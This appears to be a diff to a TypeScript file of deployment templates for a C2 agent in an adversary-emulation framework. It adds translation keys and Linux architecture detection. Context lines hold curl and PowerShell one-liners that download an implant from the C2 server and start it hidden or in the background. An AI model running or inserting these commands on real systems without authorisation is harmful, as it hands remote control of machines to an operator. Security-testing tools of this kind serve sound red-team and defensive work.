@@ -14,8 +14,12 @@
  * serves the matching prebuilt binary.)
  */
 
+/** Stable id the UI translates; `description` stays as the English fallback. */
+export type DeployDescriptionKey = "default" | "blueTeam" | "background";
+
 export interface DeployVariation {
   description: string;
+  descriptionKey: DeployDescriptionKey;
   command: string;
 }
 
@@ -23,6 +27,7 @@ export interface DeployTemplate {
   platform: "linux" | "windows" | "darwin";
   executor: string;
   description: string;
+  descriptionKey: DeployDescriptionKey;
   command: string;
   variations: DeployVariation[];
 }
@@ -30,13 +35,17 @@ export interface DeployTemplate {
 const AGENT_DESCRIPTION =
   "The default agent, written in GoLang. Communicates over the HTTP contact.";
 
-// darwin ships for both amd64 and arm64, and the C2 serves the build matching
-// the `architecture` header, so detect the host arch instead of assuming amd64.
-const ARCH_PREAMBLE = `arch=$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/');`;
+// linux and darwin both ship multiple arches (linux: amd64/arm64/arm,
+// darwin: amd64/arm64), and the C2 serves the build matching the `architecture`
+// header, so detect the host arch instead of assuming amd64. The sed maps
+// `uname -m` to the GOARCH names /file/download resolves:
+//   x86_64 -> amd64, aarch64 -> arm64, armv6l/armv7l -> arm (32-bit Raspberry Pi).
+const ARCH_PREAMBLE = `arch=$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/;s/armv[0-9]*l/arm/');`;
+const archPlatforms = new Set(["darwin", "linux"]);
 const archHeader = (platform: string) =>
-  platform === "darwin" ? ' -H "architecture:$arch"' : "";
+  archPlatforms.has(platform) ? ' -H "architecture:$arch"' : "";
 const archPreamble = (platform: string) =>
-  platform === "darwin" ? ARCH_PREAMBLE : "";
+  archPlatforms.has(platform) ? ARCH_PREAMBLE : "";
 
 const nixDefault = (platform: string) => `${archPreamble(platform)}server="#{app.contact.http}";
 curl -s -X POST -H "file:sandcat.go" -H "platform:${platform}"${archHeader(platform)} $server/file/download > #{agents.implant_name};
@@ -54,14 +63,17 @@ export const DEPLOY_TEMPLATES: DeployTemplate[] = [
     platform: "linux",
     executor: "sh",
     description: AGENT_DESCRIPTION,
+    descriptionKey: "default",
     command: nixDefault("linux"),
     variations: [
       {
         description: "Deploy as a blue-team agent instead of red",
+        descriptionKey: "blueTeam",
         command: nixGroup("linux", "blue"),
       },
       {
         description: "Download with a random name and start as a background process",
+        descriptionKey: "background",
         command: nixBackground("linux"),
       },
     ],
@@ -70,6 +82,7 @@ export const DEPLOY_TEMPLATES: DeployTemplate[] = [
     platform: "windows",
     executor: "psh",
     description: AGENT_DESCRIPTION,
+    descriptionKey: "default",
     command: `$server="#{app.contact.http}";
 $url="$server/file/download";
 $wc=New-Object System.Net.WebClient;
@@ -83,6 +96,7 @@ Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentL
     variations: [
       {
         description: "Deploy as a blue-team agent instead of red",
+        descriptionKey: "blueTeam",
         command: `$server="#{app.contact.http}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\#{agents.implant_name}.exe"} | stop-process -f;rm -force "C:\\Users\\Public\\#{agents.implant_name}.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\\Public\\#{agents.implant_name}.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;`,
       },
     ],
@@ -91,14 +105,17 @@ Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentL
     platform: "darwin",
     executor: "sh",
     description: AGENT_DESCRIPTION,
+    descriptionKey: "default",
     command: nixDefault("darwin"),
     variations: [
       {
         description: "Deploy as a blue-team agent instead of red",
+        descriptionKey: "blueTeam",
         command: nixGroup("darwin", "blue"),
       },
       {
         description: "Download with a random name and start as a background process",
+        descriptionKey: "background",
         command: nixBackground("darwin"),
       },
     ],
